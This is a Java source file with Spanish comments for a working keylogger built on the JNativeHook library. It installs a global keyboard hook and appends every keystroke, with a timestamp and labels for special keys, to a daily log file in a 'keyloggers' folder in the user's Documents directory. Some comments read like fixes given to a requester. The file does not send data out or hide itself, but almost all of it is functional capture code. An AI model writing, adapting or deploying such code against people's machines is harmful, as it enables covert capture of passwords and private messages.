import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Clock;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.time.LocalTime;

/*
* ¿Qué hace cada cosa?
*
* */

public class Main implements NativeKeyListener {

    DateTimeFormatter formatTime = DateTimeFormatter.ofPattern("HH:mm:ss");
    private int keyCode;

    public void nativeKeyPressed(NativeKeyEvent e) {
        // aSystem.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

        /* Termina el programa cuando presionas ESCAPE */
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException ex) {
                ex.printStackTrace();
            }
        }
        keyCode = e.getKeyCode();
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        // System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    /* Sobre tu comentario: nativeKeyTyped es para caracteres, no códigos de tecla */
    public void nativeKeyTyped(NativeKeyEvent e) {
        // En lugar de e.getKeyCode(), keyTyped usa e.getKeyChar()
        // System.out.println("Key Typed: " + e.getKeyChar());
        // String key = NativeKeyEvent.getKeyText(e.getKeyCode());
        String key = findKey(keyCode);
        if(key == ""){
            key = String.valueOf(e.getKeyChar());
        }
        updateFile(key);
    }

    public String findKey(int keyCode){
        switch (keyCode){
            case 14:
                return "[BACKSPACE]";
            case 15:
                return "[TAB]";
            case 28:
                return "[ENTER]";
            case 29:
                return "[CTRL]";
            case 42:
                return "[SHIFT IZ]";
            case 56:
                return "[ALT]";
            case 57:
                return "[SPACE]";
            case 58:
                return "[BLOQMAYUS]";
            case 69:
                return "[BLOQNUM]";
            case 3638:
                return "[SHIFT DER]";
            case 3675:
                return "[WINDOWS / HOME]";
            default:
                return "";
        }
    }

    public void updateDoc(String key, String path){
        // Definir formato y fecha
        String hour = "[" + LocalTime.now().format(formatTime) + "]";
        try{
            FileWriter writer = new FileWriter(path, true);
            writer.write(hour + " " + key + "\n");
            writer.close();
        }catch(IOException errIO){
            System.out.println("A error ocurred.");
            errIO.printStackTrace();
        }
    }

    public void updateFile(String key){
        Path path = Paths.get(System.getProperty("user.home"),
                "Documents",
                "keyloggers",
                LocalDate.now() + ".txt"
                );
        String strPath = String.valueOf(path);
        File flNew = new File(strPath);
        try{
            // Confirmar existencia, de no existir, se crea y agrega el nuevo dato
            /*
            * Dos opciones:
            * 1. El archivo se creó recién, entonces aceptamos y actualizamos linea.
            * 2. El archivo ya está creado, por lo que daría error (?)
            * */
            flNew.createNewFile();
            updateDoc(key, flNew.getPath());
        }catch(IOException errIO){
            System.out.println("A error ocurred.");
            errIO.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            /* Registra jNativeHook en el sistema operativo */
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("Hubo un problema al registrar el hook nativo.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }

        /* * SOLUCIÓN AQUÍ:
         * 1. GlobalScreen.addNativeKeyListener es ahora estático (sin getInstance)
         * 2. Instanciamos 'new Main()' porque así se llama esta clase
         */
        GlobalScreen.addNativeKeyListener(new Main());
    }
}